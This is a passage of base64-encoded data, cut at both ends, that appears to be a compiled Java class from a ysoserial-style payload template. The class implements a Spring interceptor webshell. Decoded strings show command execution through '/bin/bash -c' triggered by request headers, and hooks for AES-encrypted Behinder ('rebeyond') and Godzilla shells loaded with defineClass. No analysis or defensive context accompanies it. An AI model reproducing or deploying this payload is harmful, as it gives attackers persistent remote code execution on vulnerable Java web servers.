lV4cGMzUUJBQlZNYW1GMllTOTFkR2xzTDBGeWNtRjVUR2x6ZERzQkFBVm1hV1ZzWkFFQUdVeHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOUdhV1ZzWkRzQkFBdHlaV0ZzVW1WeGRXVnpkQUVBSjB4dmNtY3ZZWEJoWTJobEwyTmhkR0ZzYVc1aEwyTnZibTVsWTNSdmNpOVNaWEYxWlhOME93RUFFbU52ZVc5MFpWSmxjWFZsYzNSR2FXVnNaQUVBRFdOdmVXOTBaVkpsY1hWbGMzUUJBQnRNYjNKbkwyRndZV05vWlM5amIzbHZkR1V2VW1WeGRXVnpkRHNCQUFwd1lYSmhiV1YwWlhKekFRQW9URzl5Wnk5aGNHRmphR1V2ZEc5dFkyRjBMM1YwYVd3dmFIUjBjQzlRWVhKaGJXVjBaWEp6T3dFQUQzQmhjbUZ0U0dGemFGWmhiSFZsY3dFQUNIQmhjbUZ0VFdGd0FRQVpUR3BoZG1FdmRYUnBiQzlNYVc1clpXUklZWE5vVFdGd093RUFDR2wwWlhKaGRHOXlBUUFVVEdwaGRtRXZkWFJwYkM5SmRHVnlZWFJ2Y2pzQkFBdHdZV2RsUTI5dWRHVjRkQUVBRTB4cVlYWmhMM1YwYVd3dlNHRnphRTFoY0RzQkFBZHpaWE56YVc5dUFRQWdUR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnpjMmx2YmpzQkFBRnJBUUFCWXdFQUZVeHFZWFpoZUM5amNubHdkRzh2UTJsd2FHVnlPd0VBQm0xbGRHaHZaQUVBRG1WMmFXeGpiR0Z6YzE5aWVYUmxBUUFKWlhacGJHTnNZWE56QVFBT2RYSnNRMnhoYzNOTWIyRmtaWElCQUJsTWFtRjJZUzl1WlhRdlZWSk1RMnhoYzNOTWIyRmtaWEk3QVFBSlpHVm1UV1YwYUc5a0FRQUdZWEp5VDNWMEFRQWZUR3BoZG1FdmFXOHZRbmwwWlVGeWNtRjVUM1YwY0hWMFUzUnlaV0Z0T3dFQUFXWUJBQVJrWVhSaEFRQUxiR0Z6ZEZKbGNYVmxjM1FCQUF4c1lYTjBVbVZ6Y0c5dWMyVUJBQWR5WlhGMVpYTjBBUUFuVEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjWFZsYzNRN0FRQUljbVZ6Y0c5dWMyVUJBQ2hNYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWEoyYkdWMFVtVnpjRzl1YzJVN0FRQUhhR0Z1Wkd4bGNnRUFGa3h2WTJGc1ZtRnlhV0ZpYkdWVWVYQmxWR0ZpYkdVQkFGSk1hbUYyWVM5MWRHbHNMMDFoY0NSRmJuUnllVHhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenRNYW1GMllTOTFkR2xzTDBGeWNtRjVUR2x6ZER4TWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzK096NDdBUUFwVEdwaGRtRXZkWFJwYkM5QmNuSmhlVXhwYzNROFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN1Bqc0JBR2hNYW1GMllTOTFkR2xzTDBsMFpYSmhkRzl5UEV4cVlYWmhMM1YwYVd3dlRXRndKRVZ1ZEhKNVBFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk8weHFZWFpoTDNWMGFXd3ZRWEp5WVhsTWFYTjBQRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PejQ3UGpzK093Y0JHd2NCbXdjQXZnY0JWQWNCbkFjQm1RY0JuUWNCbmdjQm53Y0JYd2NCWUFjQm9BY0JZZ2NCb1FjQmFnY0JjQUVBQVhnQkFBY29XMEphS1Z0Q0FRQUJXZ2NCb2dFQUNsTnZkWEpqWlVacGJHVUJBQjVUY0hKcGJtZEpiblJsY21ObGNIUnZjbFJsYlhCc1lYUmxMbXBoZG1FTUFKc0FuQUVBRUdZMU5XVXlOemMwTmpnNE5HRTBZbVFNQUpVQWxnd0Fsd0NXQVFBWGFtRjJZUzlzWVc1bkwxTjBjbWx1WjBKMWFXeGtaWElNQWFNQnBBd0JwUUdtREFDWUFMQU1BSmdBbGdFQUVHcGhkbUV1ZFhScGJDNUNZWE5sTmpRTUFhY0JxQUVBQ21kbGRFUmxZMjlrWlhJTUFha0JxZ2NCbXd3QnF3R3NEQUd0QWE0QkFBWmtaV052WkdVQkFBOXFZWFpoTDJ4aGJtY3ZRMnhoYzNNQkFCQnFZWFpoTDJ4aGJtY3ZVM1J5YVc1bkFRQVFhbUYyWVM5c1lXNW5MMDlpYW1WamRBRUFFMnBoZG1FdmJHRnVaeTlGZUdObGNIUnBiMjRCQUJaemRXNHViV2x6WXk1Q1FWTkZOalJFWldOdlpHVnlEQUd2QWJBQkFBeGtaV052WkdWQ2RXWm1aWElCQUFOTlJEVUhBYkVNQWJJQnN3d0J0QUcxREFHMkFiY01BYmdCdVFFQUZHcGhkbUV2YldGMGFDOUNhV2RKYm5SbFoyVnlEQUc2QWJVTUFKc0J1d3dCcFFHOERBRzlBYVlCQUFwblpYUkZibU52WkdWeUFRQU9aVzVqYjJSbFZHOVRkSEpwYm1jQkFCWnpkVzR1Yldsell5NUNRVk5GTmpSRmJtTnZaR1Z5QVFBR1pXNWpiMlJsQVFBSFVtVm1aWEpsY2djQm5Rd0J2Z0N3QVFBWGFIUjBjSE02THk5M2QzY3VaMjl2WjJ4bExtTnZiUzhNQWI4QndBRUFLMjl5Wnk5aGNHRmphR1V2WTJGMFlXeHBibUV2WTI5dWJtVmpkRzl5TDFKbGNYVmxjM1JHWVdOaFpHVUJBQ05xWVhaaGVDOXpaWEoyYkdWMEwxTmxjblpzWlhSU1pYRjFaWE4wVjNKaGNIQmxjZ0VBTEc5eVp5OWhjR0ZqYUdVdlkyRjBZV3hwYm1FdlkyOXVibVZqZEc5eUwxSmxjM0J2Ym5ObFJtRmpZV1JsQVFBa2FtRjJZWGd2YzJWeWRteGxkQzlUWlhKMmJHVjBVbVZ6Y0c5dWMyVlhjbUZ3Y0dWeUFRQU5lQzFqYkdsbGJuUXRaR0YwWVF3QndRSENBUUFIYjNNdWJtRnRaUWNCd3d3QnhBQ3dEQUhGQWFZQkFBTjNhVzRNQWNZQnh3RUFBaTlqQVFBSkwySnBiaTlpWVhOb0FRQUNMV01CQUJGcVlYWmhMM1YwYVd3dlUyTmhibTVsY2djQnlBd0J5UUhLREFITEFjd0hBYzBNQWM0Qnp3d0Ftd0hRQVFBQ1hFRU1BZEVCMGd3QXdRR21EQUhUQWRRSEFkVU1BZFlCMXdFQUNISmxZbVY1YjI1a0RBR3BBYVlCQUFSUVQxTlVEQUhZQWRrQkFCRnFZWFpoTDNWMGFXd3ZTR0Z6YUUxaGNBd0IyZ0hiREFIY0FkME1BZDRCM3djQjRBd0I0UUdtQVFBQURBSGlBZU1IQVo4TUFlUUI1UXdCNWdIbkFRQWxiM0puTDJGd1lXTm9aUzlqWVhSaGJHbHVZUzlqYjI1dVpXTjBiM0l2VW1WeGRXVnpkQUVBR1c5eVp5OWhjR0ZqYUdVdlkyOTViM1JsTDFKbGNYVmxjM1FNQWVnQjZRRUFGMnBoZG1FdmRYUnBiQzlNYVc1clpXUklZWE5vVFdGd0RBSHFBZXNIQWV3TUFOUUI3UWNCb1F3QjdnSENEQURCQWJBSEFlOEJBQk5xWVhaaEwzVjBhV3d2VFdGd0pFVnVkSEo1REFId0FiQUJBQUVnQVFBQkt3d0I4UUh5REFIekFiQUJBQk5xWVhaaEwzVjBhV3d2UVhKeVlYbE1hWE4wREFIMEFiY0JBQUU5REFIbUFmVUJBQUYxQndHY0RBSDJBZmNCQUFOQlJWTUhBYUlNQWJJQitBRUFIMnBoZG1GNEwyTnllWEIwYnk5emNHVmpMMU5sWTNKbGRFdGxlVk53WldNTUFKc0IrUXdCK2dIN0FRQVZhbUYyWVM1c1lXNW5Ma05zWVhOelRHOWhaR1Z5QVFBTFpHVm1hVzVsUTJ4aGMzTUhBZndNQWYwQW1nd0IvZ0dxQVFBV2MzVnVMMjFwYzJNdlFrRlRSVFkwUkdWamIyUmxjZ3dCSHdDakRBSC9BZ0FIQWdFTUFnSUNBd3dDQkFJRkRBSUdBZ2NCQUFobmIyUjZhV3hzWVF3Q0NBQ3dEQUNpQUtNTUFRSUJBd3dBbVFDYUFRQVhhbUYyWVM5dVpYUXZWVkpNUTJ4aGMzTk1iMkZrWlhJQkFBeHFZWFpoTDI1bGRDOVZVa3dNQUpzQ0NRRUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2dFQUhXcGhkbUV2YVc4dlFubDBaVUZ5Y21GNVQzVjBjSFYwVTNSeVpXRnRCd0dlREFJS0Fnc01BZ3dCMXd3Q0RRRzFEQUMxQUxZTUFnb0J2QUVBTm5semIzTmxjbWxoYkM5d1lYbHNiMkZrY3k5MFpXMXdiR0YwWlhNdlUzQnlhVzVuU1c1MFpYSmpaWEIwYjNKVVpXMXdiR0YwWlFFQVFXOXlaeTl6Y0hKcGJtZG1jbUZ0WlhkdmNtc3ZkMlZpTDNObGNuWnNaWFF2YUdGdVpHeGxjaTlJWVc1a2JHVnlTVzUwWlhKalpYQjBiM0pCWkdGd2RHVnlBUUFZYW1GMllTOXNZVzVuTDNKbFpteGxZM1F2VFdWMGFHOWtBUUFlYW1GMllYZ3ZjMlZ5ZG14bGRDOW9kSFJ3TDBoMGRIQlRaWE56YVc5dUFRQWxhbUYyWVhndmMyVnlkbXhsZEM5b2RIUndMMGgwZEhCVFpYSjJiR1YwVW1WeGRXVnpkQUVBSm1waGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjM0J2Ym5ObEFRQVhhbUYyWVM5c1lXNW5MM0psWm14bFkzUXZSbWxsYkdRQkFDWnZjbWN2WVhCaFkyaGxMM1J2YldOaGRDOTFkR2xzTDJoMGRIQXZVR0Z5WVcxbGRHVnljd0VBRW1waGRtRXZkWFJwYkM5SmRHVnlZWFJ2Y2dFQUUycGhkbUY0TDJOeWVYQjBieTlEYVhCb1pYSUJBQVpoY0hCbGJtUUJBQzBvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuUW5WcGJHUmxjanNCQUFoMGIxTjBjbWx1WndFQUZDZ3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFIWm05eVRtRnRaUUVBSlNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQkFBbG5aWFJOWlhSb2IyUUJBRUFvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3VzB4cVlYWmhMMnhoYm1jdlEyeGhjM003S1V4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5TlpYUm9iMlE3QVFBR2FXNTJiMnRsQVFBNUtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME8xdE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdBUUFJWjJWMFEyeGhjM01CQUJNb0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUxibVYzU1c1emRHRnVZMlVCQUJRb0tVeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME93RUFHMnBoZG1FdmMyVmpkWEpwZEhrdlRXVnpjMkZuWlVScFoyVnpkQUVBQzJkbGRFbHVjM1JoYm1ObEFRQXhLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXpaV04xY21sMGVTOU5aWE56WVdkbFJHbG5aWE4wT3dFQUNHZGxkRUo1ZEdWekFRQUVLQ2xiUWdFQUJteGxibWQwYUFFQUF5Z3BTUUVBQm5Wd1pHRjBaUUVBQnloYlFrbEpLVllCQUFaa2FXZGxjM1FCQUFZb1NWdENLVllCQUJVb1NTbE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQXQwYjFWd2NHVnlRMkZ6WlFFQUNXZGxkRWhsWVdSbGNnRUFFR1Z4ZFdGc2MwbG5ibTl5WlVOaGMyVUJBQlVvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZvQkFBZHBjMFZ0Y0hSNUFRQURLQ2xhQVFBUWFtRjJZUzlzWVc1bkwxTjVjM1JsYlFFQUMyZGxkRkJ5YjNCbGNuUjVBUUFMZEc5TWIzZGxja05oYzJVQkFBaGpiMjUwWVdsdWN3RUFHeWhNYW1GMllTOXNZVzVuTDBOb1lYSlRaWEYxWlc1alpUc3BXZ0VBRVdwaGRtRXZiR0Z1Wnk5U2RXNTBhVzFsQVFBS1oyVjBVblZ1ZEdsdFpRRUFGU2dwVEdwaGRtRXZiR0Z1Wnk5U2RXNTBhVzFsT3dFQUJHVjRaV01CQUNnb1cweHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5c1lXNW5MMUJ5YjJObGMzTTdBUUFSYW1GMllTOXNZVzVuTDFCeWIyTmxjM01CQUE1blpYUkpibkIxZEZOMGNtVmhiUUVBRnlncFRHcGhkbUV2YVc4dlNXNXdkWFJUZEhKbFlXMDdBUUFZS0V4cVlYWmhMMmx2TDBsdWNIVjBVM1J5WldGdE95bFdBUUFNZFhObFJHVnNhVzFwZEdWeUFRQW5LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOTFkR2xzTDFOallXNXVaWEk3QVFBSloyVjBWM0pwZEdWeUFRQVhLQ2xNYW1GMllTOXBieTlRY21sdWRGZHlhWFJsY2pzQkFCTnFZWFpoTDJsdkwxQnlhVzUwVjNKcGRHVnlBUUFIY0hKcGJuUnNiZ0VBRlNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFZnRUFCbVZ4ZFdGc2N3RUFGU2hNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNwV2dFQUNtZGxkRk5sYzNOcGIyNEJBQ0lvS1V4cVlYWmhlQzl6WlhKMmJHVjBMMmgwZEhBdlNIUjBjRk5sYzNOcGIyNDdBUUFEY0hWMEFRQTRLRXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPMHhxWVhaaEwyeGhibWN2VDJKcVpXTjBPeWxNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNCQUFsblpYUlNaV0ZrWlhJQkFCb29LVXhxWVhaaEwybHZMMEoxWm1abGNtVmtVbVZoWkdWeU93RUFGbXBoZG1FdmFXOHZRblZtWm1WeVpXUlNaV0ZrWlhJQkFBaHlaV0ZrVEdsdVpRRUFFR2RsZEVSbFkyeGhjbVZrUm1sbGJHUUJBQzBvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5R2FXVnNaRHNCQUExelpYUkJZMk5sYzNOcFlteGxBUUFFS0ZvcFZnRUFBMmRsZEFFQUppaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdBUUFOWjJWMFVHRnlZVzFsZEdWeWN3RUFLaWdwVEc5eVp5OWhjR0ZqYUdVdmRHOXRZMkYwTDNWMGFXd3ZhSFIwY0M5UVlYSmhiV1YwWlhKek93RUFDR1Z1ZEhKNVUyVjBBUUFSS0NsTWFtRjJZUzkxZEdsc0wxTmxkRHNCQUExcVlYWmhMM1YwYVd3dlUyVjBBUUFXS0NsTWFtRjJZUzkxZEdsc0wwbDBaWEpoZEc5eU93RUFCMmhoYzA1bGVIUUJBQTFxWVhaaEwzVjBhV3d2VFdGd0FRQUdaMlYwUzJWNUFRQUtjbVZ3YkdGalpVRnNiQUVBT0NoTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUlaMlYwVm1Gc2RXVUJBQVJ6YVhwbEFRQVZLRWtwVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3QVFBSWNIVjBWbUZzZFdVQkFDY29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVllCQUNrb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoZUM5amNubHdkRzh2UTJsd2FHVnlPd0VBRnloYlFreHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bFdBUUFFYVc1cGRBRUFGeWhKVEdwaGRtRXZjMlZqZFhKcGRIa3ZTMlY1T3lsV0FRQVJhbUYyWVM5c1lXNW5MMGx1ZEdWblpYSUJBQVJVV1ZCRkFRQVJaMlYwUkdWamJHRnlaV1JOWlhSb2IyUUJBQWRrYjBacGJtRnNBUUFHS0Z0Q0tWdENBUUFRYW1GMllTOXNZVzVuTDFSb2NtVmhaQUVBRFdOMWNuSmxiblJVYUhKbFlXUUJBQlFvS1V4cVlYWmhMMnhoYm1jdlZHaHlaV0ZrT3dFQUZXZGxkRU52Ym5SbGVIUkRiR0Z6YzB4dllXUmxjZ0VBR1NncFRHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNCQUFkMllXeDFaVTltQVFBV0tFa3BUR3BoZG1FdmJHRnVaeTlKYm5SbFoyVnlPd0VBREdkbGRGQmhjbUZ0WlhSbGNnRUFLU2hiVEdwaGRtRXZibVYwTDFWU1REdE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3lsV0FRQUpjM1ZpYzNSeWFXNW5BUUFXS0VsSktVeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk93RUFCWGR5YVhSbEFRQUxkRzlDZVhSbFFYSnlZWGtBSVFDVEFKUUFBQUFFQUFBQWxRQ1dBQUFBQUFDWEFKWUFBQUFBQUpnQWxnQUFBQUFBbVFDYUFBQUFCZ0FCQUpzQW5BQUJBSjBBQUFCbUFBTUFBUUFBQURBcXR3QUJLaElDdFFBREtoSUV0UUFGS3JzQUJsbTNBQWNxdEFBRnRnQUlLclFBQTdZQUNMWUFDYmdBQ3JVQUM3RUFBQUFDQUo0QUFBQVNBQVFBQUFBWEFBUUFHUUFLQUJvQUVBQWJBSjhBQUFBTUFBRUFBQUF3QUtBQW9RQUFBQWtBb2dDakFBSUFuUUFBQVVvQUJnQUZBQUFBZUFGTkVneTRBQTFNS3hJT0FiWUFEeXNCdGdBUVRpMjJBQkVTRWdTOUFCTlpBeElVVTdZQUR5MEV2UUFWV1FNcVU3WUFFTUFBRnNBQUZrMm5BRHhPRWhpNEFBMU1LN1lBR1RvRUdRUzJBQkVTR2dTOUFCTlpBeElVVTdZQUR4a0VCTDBBRlZrREtsTzJBQkRBQUJiQUFCWk5wd0FGT2dRc3NBQUNBQUlBT2dBOUFCY0FQZ0J4QUhRQUZ3QURBSjRBQUFBeUFBd0FBQUFnQUFJQUlnQUlBQ01BRlFBa0FEb0FMQUE5QUNVQVBnQW5BRVFBS0FCS0FDa0FjUUFyQUhRQUtnQjJBQzBBbndBQUFFZ0FCd0FWQUNVQXBBQ2xBQU1BQ0FBMUFLWUFtZ0FCQUVvQUp3Q2tBS1VBQkFCRUFEQUFwZ0NhQUFFQVBnQTRBS2NBcUFBREFBQUFlQUNwQUpZQUFBQUNBSFlBcWdDckFBSUFyQUFBQUNvQUEvOEFQUUFEQndDdEFBY0FGZ0FCQndDdS93QTJBQVFIQUswQUJ3QVdCd0N1QUFFSEFLNzZBQUVBcndBQUFBUUFBUUFYQUFrQW1BQ3dBQUVBblFBQUFLY0FCQUFEQUFBQU1BRk1FaHU0QUJ4TkxDcTJBQjBES3JZQUhyWUFIN3NBSUZrRUxMWUFJYmNBSWhBUXRnQWp0Z0FrVEtjQUJFMHJzQUFCQUFJQUtnQXRBQmNBQXdDZUFBQUFIZ0FIQUFBQU1RQUNBRFFBQ0FBMUFCVUFOZ0FxQURnQUxRQTNBQzRBT1FDZkFBQUFJQUFEQUFnQUlnQ3hBTElBQWdBQUFEQUFzd0NXQUFBQUFnQXVBTFFBbGdBQkFLd0FBQUFUQUFML0FDMEFBZ2NBclFjQXJRQUJCd0N1QUFBSkFMVUF0Z0FDQUowQUFBRkVBQVlBQlFBQUFISUJUUklNdUFBTlRDc1NKUUcyQUE4ckFiWUFFRTR0dGdBUkVpWUV2UUFUV1FNU0ZsTzJBQTh0QkwwQUZWa0RLbE8yQUJEQUFCUk5wd0E1VGhJbnVBQU5UQ3UyQUJrNkJCa0V0Z0FSRWlnRXZRQVRXUU1TRmxPMkFBOFpCQVM5QUJWWkF5cFR0Z0FRd0FBVVRhY0FCVG9FTExBQUFnQUNBRGNBT2dBWEFEc0Fhd0J1QUJjQUF3Q2VBQUFBTWdBTUFBQUFQZ0FDQUVBQUNBQkJBQlVBUWdBM0FFb0FPZ0JEQURzQVJRQkJBRVlBUndCSEFHc0FTUUJ1QUVnQWNBQkxBSjhBQUFCSUFBY0FGUUFpQUxjQXBRQURBQWdBTWdDbUFKb0FBUUJIQUNRQXR3Q2xBQVFBUVFBdEFLWUFtZ0FCQURzQU5RQ25BS2dBQXdBQUFISUFxUUNyQUFBQUFnQndBS29BbGdBQ0FLd0FBQUFxQUFQL0FEb0FBd2NBRmdBSEFLMEFBUWNBcnY4QU13QUVCd0FXQUFjQXJRY0FyZ0FCQndDdStnQUJBSzhBQUFBRUFBRUFGd0FCQUxnQXVRQUNBSjBBQUFmR0FBY0FGQUFBQkJjckVpbTVBQ29DQUJJcnRnQXNtUVFES3pvRUxEb0ZHUVRCQUMyYUFEY1NMaEl2QTcwQUU3WUFEem9HR1FZckE3MEFGYllBRURvRUdRVEJBQzJaQUFhbkFCTVpCaGtFQTcwQUZiWUFFRG9FcC8vb0dRWEJBRENhQURjU01SSXlBNzBBRTdZQUR6b0dHUVlzQTcwQUZiWUFFRG9GR1FYQkFEQ1pBQWFuQUJNWkJoa0ZBNzBBRmJZQUVEb0ZwLy9vS3hJenVRQXFBZ0FTTkxZQUxKa0FoaXNTTkxrQUtnSUFPZ1laQnNZQWRCa0d0Z0ExbWdCc0FUb0hFamE0QURlMkFEZ1NPYllBT3BrQUd3YTlBQlJaQXhJMFUxa0VFanRUV1FVWkJsTTZCNmNBR0FhOUFCUlpBeEk4VTFrRUVqMVRXUVVaQmxNNkI3c0FQbG00QUQ4WkI3WUFRTFlBUWJjQVFoSkR0Z0JFdGdCRk9nZ1pCY0FBTUxZQVJoa0l0Z0JIcHdMd0t4SXp1UUFxQWdBU1NMWUFMSmtCNWl1NUFFa0JBQkpLdGdCTG1RTFN1d0JNV2JjQVRUb0dHUVRBQUMyMkFFNDZCeGtHRWs4WkJMWUFVRmNaQmhKUkdRVzJBRkJYR1FZU1Voa0h0Z0JRVnl1NUFGTUJBTFlBVkRvSUdRakdBQXNaQ0xZQU5aa0E5QkpWT2dnWkJMWUFFUkpQdGdCV09na1pDUVMyQUZjWkNSa0V0Z0JZd0FCWk9nb1pDcllBRVJKYXRnQldPZ3NaQ3dTMkFGY1pDeGtLdGdCWXdBQmJPZ3daRExZQVhEb05HUTIyQUJFU1hiWUFWam9PR1E0RXRnQlhHUTRaRGJZQVdNQUFYam9QR1ErMkFGKzVBR0FCQURvUUdSQzVBR0VCQUprQWVSa1F1UUJpQVFEQUFHTTZFUmtSdVFCa0FRREFBQlFTWlJKbXRnQm5PaElaRWJrQWFBRUF3QUJwT2hNWkU3WUFhcG9BSExzQUJsbTNBQWNaQ0xZQUNCa1N0Z0FJdGdBSk9naW5BQ3E3QUFaWnR3QUhHUWkyQUFnWkVyWUFDQkpydGdBSUdSTUR0Z0Jzd0FBVXRnQUl0Z0FKT2dpbi80TVNBam9KR1FjU2JSa0p1UUJ1QXdBU2I3Z0FjRG9LR1FvRnV3QnhXUmtKdGdBZEVtKzNBSEsyQUhNU2RMZ0FEUkoxQnIwQUUxa0RFaFpUV1FTeUFIWlRXUVd5QUhaVHRnQjNPZ3NaQ3dTMkFIZ1pDcnNBZVZtM0FIb1pDTFlBZTdZQWZEb01HUXU0QUgyMkFINEd2UUFWV1FNWkRGTlpCQU80QUg5VFdRVVpETDY0QUg5VHRnQVF3QUFUT2cwWkRiWUFHUmtHdGdDQVY2Y0EvU3NTTTdrQUtnSUFFb0cyQUN5WkFPMHJLclFBQmJrQWdnSUF1QUNET2dZcUdRWUR0Z0NFT2dZcXRBQ0Z4d0JrdXdDR1dRTzlBSWU0QUgyMkFINjNBSWc2QnhLSkVuVUd2UUFUV1FNU0ZsTlpCTElBZGxOWkJiSUFkbE8yQUhjNkNCa0lCTFlBZUNvWkNCa0hCcjBBRlZrREdRWlRXUVFEdUFCL1Uxa0ZHUWErdUFCL1U3WUFFTUFBRTdVQWhhY0FiYnNBaWxtM0FJczZCeXEwQUlXMkFCazZDQmtJR1FlMkFJQlhHUWdaQnJZQWdGY1pDQ3UyQUlCWExMa0FqQUVBS3JRQUN3TVFFTFlBamJZQWpoa0l0Z0NQVnl5NUFJd0JBQ29aQjdZQWtBUzJBSVM0QUpHMkFJNHN1UUNNQVFBcXRBQUxFQkMyQUpLMkFJNERyS2NBQlRvRUJLd0FBUUFBQkE4RUV3QVhBQVFBbmdBQUFVNEFVd0FBQUZJQUVBQlRBQk1BVkFBV0FGY0FIZ0JZQUNzQVdRQTNBRnNBUWdCY0FGSUFZQUJhQUdFQVp3QmlBSE1BWkFCK0FHVUFqZ0JwQUo0QWFnQ29BR3NBdFFCc0FMZ0FiUURJQUc0QTRBQndBUFVBY2dFUkFITUJIZ0IxQVRFQWRnRS9BSGdCU0FCN0FWSUFmQUZjQUgwQlpnQitBWEFBZ0FGN0FJRUJpQUNDQVl3QWhBR1lBSVVCbmdDR0Fhb0FpQUcyQUlrQnZBQ0tBY2dBaXdIUEFJd0Iyd0NOQWVFQWpnSHRBSkFCK1FDUkFnTUFrZ0lQQUpNQ0lnQ1VBaTRBbFFJMkFKWUNUd0NZQW5ZQW1nSjVBSjhDZlFDZ0FvZ0FvUUtQQUtJQ293Q2pBc1FBcEFMS0FLVUMzUUNtQXdZQXB3TVJBS2dERkFDcEF5UUFxd016QUt3RFBBQ3RBME1BcmdOV0FLOERkQUN3QTNvQXNRT2hBTElEcEFDekE2MEF0QU8yQUxVRHZnQzJBOFlBdHdQTkFMZ0Q0QUM1QStZQXVnUDhBTHNFRGdDK0JCQUF3Z1FUQU1BRUZRRERBSjhBQUFGZ0FDTUFLd0FuQUxvQXV3QUdBR2NBSndDOEFMc0FCZ0M0QUdZQXZRQytBQWNCRVFBTkFMOEFsZ0FJQUtnQWRnREFBSllBQmdJUEFHY0F3UURFQUJFQ0lnQlVBTVVBbGdBU0FpNEFTQURHQU1jQUV3R1lBT0VBeUFESkFBa0JxZ0RQQU1vQXl3QUtBYllBd3dETUFNa0FDd0hJQUxFQXpRRE9BQXdCendDcUFNOEEwQUFOQWRzQW5nRFJBTWtBRGdIdEFJd0EwZ0RUQUE4QitRQ0FBTlFBMVFBUUFVZ0J5UURXQU5jQUJnRlNBYjhBMkFEWkFBY0Jld0dXQUprQWxnQUlBbjBBbEFEYUFKWUFDUUtQQUlJQTJ3RGNBQW9DeEFCTkFOMEF1d0FMQXQwQU5BRGVBS3NBREFNR0FBc0Ezd0NhQUEwRFZnQkxBT0FBNFFBSEEzUUFMUURpQUxzQUNBT3RBR0VBNHdEa0FBY0R0Z0JZQU9VQXBRQUlBek1BMndEbUFLc0FCZ0FUQS8wQTV3Q2xBQVFBRmdQNkFPZ0FwUUFGQUFBRUZ3Q2dBS0VBQUFBQUJCY0E2UURxQUFFQUFBUVhBT3NBN0FBQ0FBQUVGd0R0QUtVQUF3RHVBQUFBSUFBREFnOEFad0RCQU84QUVRSXVBRWdBeGdEd0FCTUIrUUNBQU5RQThRQVFBS3dBQUFDMUFCWCtBRGNIQVBJSEFQSUhBUE1LK2dBUC9BQWdCd0R6Q3ZvQUQvMEFVUWNBclFjQTlCVDVBQ2dDL2dCbUJ3RDFCd0QyQndDdC93QndBQkVIQVBjSEFQZ0hBUGtIQVBJSEFQSUhBUElIQVBVSEFQWUhBSzBIQVBvSEFQc0hBUG9IQVB3SEFQMEhBUG9IQVA0SEFQOEFBUDRBVlFjQkFBY0FyUWNCQWZnQUp2OEFBZ0FKQndEM0J3RDRCd0Q1QndEeUJ3RHlCd0R5QndEMUJ3RDJCd0N0QUFENEFKcjhBSThIQUJiNkFHbjVBQUZDQndDdUFRQ3ZBQUFBQkFBQkFCY0FBUUVDQVFNQUFRQ2RBQUFBMkFBR0FBUUFBQUFzRW0rNEFIQk9MUnlaQUFjRXB3QUVCYnNBY1ZrcXRBQUR0Z0FkRW0rM0FISzJBSE10SzdZQWZMQk9BYkFBQVFBQUFDZ0FLUUFYQUFNQW5nQUFBQllBQlFBQUFNZ0FCZ0RKQUNNQXlnQXBBTXNBS2dETUFKOEFBQUEwQUFVQUJnQWpBTnNBM0FBREFDb0FBZ0NuQUtnQUF3QUFBQ3dBb0FDaEFBQUFBQUFzQUxNQXF3QUJBQUFBTEFDeEFRUUFBZ0NzQUFBQVBBQUQvd0FQQUFRSEFQY0hBQllCQndFRkFBRUhBUVgvQUFBQUJBY0E5d2NBRmdFSEFRVUFBZ2NCQlFIL0FCZ0FBd2NBOXdjQUZnRUFBUWNBcmdBQ0FRWUFBQUFDQVFjQXd3QUFBQW9BQVFCakFXa0F3Z1lKAQA7b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuc2VydmxldC5zdXBwb3J0LlJlcXVlc3RDb250ZXh0VXRpbHMMAIoAiwEAD2phdmEvbGFuZy9DbGFzcwEAHGphdmF4L3NlcnZsZXQvU2Vyd